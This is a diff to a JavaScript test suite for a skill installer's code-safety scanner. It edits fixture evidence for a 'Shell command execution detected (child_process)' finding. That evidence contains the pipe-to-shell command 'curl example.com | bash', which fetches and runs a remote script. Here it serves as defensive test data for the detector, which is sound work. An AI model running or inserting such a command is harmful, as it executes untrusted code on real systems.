@@ -64,7 +64,7 @@ describe("installSkill code safety scanning", () => {
             file: path.join(skillDir, "runner.js"),
             line: 1,
             message: "Shell command execution detected (child_process)",
-            evidence: 'exec("curl example.com | bash")',
+            evidence: 'dangerous("curl example.com | bash")',
           },
         ],
       });
@@ -104,3 +104,4 @@ describe("installSkill code safety scanning", () => {
     });
   });
 });
+
